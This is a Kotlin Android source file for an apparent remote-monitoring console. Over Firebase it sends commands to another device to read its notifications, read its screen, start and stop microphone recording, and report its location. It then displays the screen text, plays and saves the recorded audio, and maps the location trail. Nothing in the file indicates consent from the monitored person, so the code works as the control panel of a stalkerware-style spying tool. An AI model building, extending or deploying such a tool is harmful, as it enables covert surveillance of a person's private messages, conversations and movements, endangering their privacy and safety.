package com.jonas.x24

import android.content.ContentValues
import android.content.Context
import android.graphics.BitmapFactory
import android.graphics.Color
import android.media.MediaPlayer
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.util.Base64
import android.view.View
import android.widget.Button
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import org.osmdroid.config.Configuration
import org.osmdroid.util.GeoPoint
import org.osmdroid.views.MapView
import org.osmdroid.views.overlay.Marker
import org.osmdroid.views.overlay.Polyline
import java.io.File
import java.io.FileOutputStream

class MonitorActivity : AppCompatActivity() {

    private lateinit var sessionKey: String
    private lateinit var database: DatabaseReference
    private lateinit var tvResults: TextView
    private lateinit var mapView: MapView
    private lateinit var btnSaveAudio: Button
    private lateinit var llResults: LinearLayout
    private var lastAudioBase64: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Configuration.getInstance().load(applicationContext, getSharedPreferences("osmdroid", Context.MODE_PRIVATE))
        setContentView(R.layout.activity_monitor)

        sessionKey = intent.getStringExtra("SESSION_KEY") ?: return finish()
        database = FirebaseDatabase.getInstance().reference.child("sessions").child(sessionKey)

        mapView = findViewById(R.id.mapView)
        mapView.setMultiTouchControls(true)

        btnSaveAudio = findViewById(R.id.btnSaveAudio)
        llResults = findViewById(R.id.llResults)

        tvResults = findViewById(R.id.tvResults)

        btnSaveAudio.setOnClickListener {
            saveLatestAudioToDownloads()
        }

        findViewById<Button>(R.id.btnReadNotifications).setOnClickListener {
            sendCommand("READ_NOTIFICATIONS")
        }

        findViewById<Button>(R.id.btnReadScreen).setOnClickListener {
            sendCommand("READ_SCREEN")
        }

        findViewById<Button>(R.id.btnStartRecord).setOnClickListener {
            sendCommand("START_RECORD_AUDIO")
        }

        findViewById<Button>(R.id.btnStopRecord).setOnClickListener {
            sendCommand("STOP_RECORD_AUDIO")
        }

        findViewById<Button>(R.id.btnGetLocation).setOnClickListener {
            sendCommand("GET_LOCATION")
        }

        findViewById<Button>(R.id.btnLogout).setOnClickListener {
            logout()
        }

        listenForResults()
    }

    override fun onResume() {
        super.onResume()
        mapView.onResume()
    }

    override fun onPause() {
        super.onPause()
        mapView.onPause()
    }

    private fun logout() {
        val prefs = getSharedPreferences("x24_prefs", android.content.Context.MODE_PRIVATE)
        prefs.edit().clear().apply()
        val intent = android.content.Intent(this, MainActivity::class.java)
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK)
        startActivity(intent)
        finish()
    }

    private fun sendCommand(command: String) {
        val commandRef = database.child("commands").push()
        val data = mapOf(
            "command" to command,
            "timestamp" to System.currentTimeMillis()
        )
        commandRef.setValue(data).addOnSuccessListener {
            Toast.makeText(this, "Command sent: $command", Toast.LENGTH_SHORT).show()
        }
    }

    private fun listenForResults() {
        database.child("results").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val children = snapshot.children.toList()

                // Clear map overlays before adding new ones from history
                mapView.overlays.clear()
                val geoPoints = mutableListOf<GeoPoint>()

                // Rebuild UI history
                llResults.removeAllViews()
                llResults.addView(tvResults) // Keep the original text view at top if needed
                llResults.addView(btnSaveAudio)

                for (child in children) {
                    val type = child.child("type").value as? String
                    val data = child.child("data").value as? String

                    if (type != null && data != null) {
                        appendResultToHistory(type, data, geoPoints)
                    }
                }

                // Update map if locations exist
                if (geoPoints.isNotEmpty()) {
                    mapView.visibility = View.VISIBLE
                    val polyline = Polyline()
                    polyline.setPoints(geoPoints)
                    polyline.color = Color.BLUE
                    mapView.overlays.add(polyline)

                    val currentPoint = geoPoints.last()
                    val marker = Marker(mapView)
                    marker.position = currentPoint
                    marker.setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
                    marker.title = "Current Location"
                    mapView.overlays.add(marker)

                    mapView.controller.setZoom(15.0)
                    mapView.controller.setCenter(currentPoint)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Toast.makeText(this@MonitorActivity, "Error listening to results", Toast.LENGTH_SHORT).show()
            }
        })
    }

    private fun appendResultToHistory(type: String, data: String, geoPoints: MutableList<GeoPoint>) {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 16, 0, 16)
        }

        val tv = TextView(this).apply {
            textSize = 14f
            setTextIsSelectable(true)
        }

        when (type) {
            "TEXT" -> {
                if (data.startsWith("Screen Context:")) {
                    tv.text = "Screen Read Received:"
                    tv.setTypeface(null, android.graphics.Typeface.BOLD)
                    container.addView(tv)
                    buildScreenReadUI(data, container)
                } else if (data.contains("Coords:")) {
                    tv.text = data
                    container.addView(tv)
                    parseLocationData(data, geoPoints)
                } else {
                    tv.text = "Text Result:\n$data"
                    container.addView(tv)
                }
            }
            "AUDIO" -> {
                tv.text = "Audio received."
                container.addView(tv)
                lastAudioBase64 = data
                btnSaveAudio.visibility = View.VISIBLE

                val btnPlay = Button(this).apply {
                    text = "Play Audio"
                    setOnClickListener { playAudioFromBase64(data) }
                }
                container.addView(btnPlay)
            }
            "ERROR" -> {
                tv.text = "Error: $data"
                tv.setTextColor(Color.RED)
                container.addView(tv)
            }
        }

        llResults.addView(container, 0) // Add to top
    }

    private fun buildScreenReadUI(data: String, container: LinearLayout) {
        val lines = data.lines().drop(1) // Drop "Screen Context:" line
        for (line in lines) {
            if (line.isBlank()) continue

            val itemTv = TextView(this).apply {
                setPadding(16, 8, 16, 8)
                text = line
                setTextIsSelectable(true)
            }

            if (line.startsWith("[Button]")) {
                itemTv.setBackgroundColor(Color.parseColor("#e0e0e0"))
                itemTv.setTextColor(Color.BLACK)
            } else if (line.startsWith("[Input]")) {
                itemTv.setBackgroundColor(Color.parseColor("#fff9c4")) // Light yellow
                itemTv.setTextColor(Color.BLACK)
            } else if (line.startsWith("[Scrollable]")) {
                itemTv.setBackgroundColor(Color.parseColor("#e1bee7")) // Light purple
                itemTv.setTextColor(Color.BLACK)
            } else {
                itemTv.setTextColor(Color.DKGRAY)
            }

            val marginParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(8, 4, 8, 4)
            }
            container.addView(itemTv, marginParams)
        }
    }

    private fun parseLocationData(data: String, geoPoints: MutableList<GeoPoint>) {
        val coordsLine = data.lines().find { it.startsWith("Coords:") }
        if (coordsLine != null) {
            val parts = coordsLine.removePrefix("Coords:").trim().split(",")
            if (parts.size == 2) {
                try {
                    val lat = parts[0].trim().toDouble()
                    val lon = parts[1].trim().toDouble()
                    geoPoints.add(GeoPoint(lat, lon))
                } catch (e: Exception) {
                    // Ignore parse errors
                }
            }
        }
    }

    private fun playAudioFromBase64(base64Audio: String) {
        try {
            val audioBytes = Base64.decode(base64Audio, Base64.DEFAULT)
            val tempFile = File.createTempFile("received_audio", ".3gp", cacheDir)
            val fos = FileOutputStream(tempFile)
            fos.write(audioBytes)
            fos.close()

            val mediaPlayer = MediaPlayer()
            mediaPlayer.setDataSource(tempFile.absolutePath)
            mediaPlayer.prepare()
            mediaPlayer.start()

            mediaPlayer.setOnCompletionListener {
                it.release()
                tempFile.delete()
            }
        } catch (e: Exception) {
            tvResults.text = "Error playing audio: ${e.message}"
        }
    }

    private fun saveLatestAudioToDownloads() {
        val audioBase64 = lastAudioBase64
        if (audioBase64 == null) {
            Toast.makeText(this, "No audio to save.", Toast.LENGTH_SHORT).show()
            return
        }

        try {
            val audioBytes = Base64.decode(audioBase64, Base64.DEFAULT)
            val fileName = "x24_audio_${System.currentTimeMillis()}.3gp"

            val resolver = applicationContext.contentResolver
            val contentValues = ContentValues().apply {
                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                put(MediaStore.MediaColumns.MIME_TYPE, "audio/3gpp")
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                }
            }

            val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
            if (uri != null) {
                resolver.openOutputStream(uri)?.use { outputStream ->
                    outputStream.write(audioBytes)
                }
                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
            } else {
                Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Error saving audio: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }
}
